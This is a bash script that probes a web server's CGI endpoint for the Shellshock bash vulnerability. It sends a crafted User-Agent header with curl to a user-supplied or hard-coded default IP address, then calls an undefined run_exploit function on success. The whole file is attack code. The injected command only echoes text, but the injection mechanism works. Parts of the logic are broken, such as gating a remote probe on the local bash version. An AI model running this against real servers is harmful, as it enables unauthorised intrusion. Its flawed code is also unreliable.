#! /bin/bash

EXPLOIT=0
EXPLOITABLE=0
VERBOSE=0

version=$(bash --version | grep 'version' | awk '{print $4}')
version=${version/(*/}

oldIFS=$IFS
IFS='.' read -r -a version_arr <<< "$version"

if [[ "${version_arr[0]}" -le '4' ]] && [[ "${version_arr[1]}" -le '3' ]]; 
then
	default_ip=18.219.242.244
	default_cgi=example-bash

	read -p "Enter target IP address: " -a target_ip
	read -p "Enter name of cgi file: " -a cgi_file

	if [[ -z "$target_ip" ]] || [[ -z "$cgi_file" ]]; 
	then
		echo Proceeding with default IP address $default_ip and cgi file $default_cgi 

		shellshock=$(curl -H "User-Agent: () { :; }; echo; echo vulnerable; bash -c 'echo hello'" http://$default_ip/cgi-bin/$default_cgi)
	else
		shellshock=$(curl -H "User-Agent: () { :; }; echo; echo vulnerable; bash -c 'echo hello'" http://$target_ip/cgi-bin/$cgi_file)
	fi 
		
	if [[ "$shellshock" = "vulnerable" ]]; then
		echo "Version suscpetible to shellshock exploit"
		EXPLOITABLE=1
	fi
fi

if [ "$EXPLOITABLE" -eq 1 ]; 
then
	run_exploit "shellshock"
else
	test $EXPLOIT != 0 && echo "Not exploitable, skipping exploit."
	exit 
fi

IFS=$oldIFS
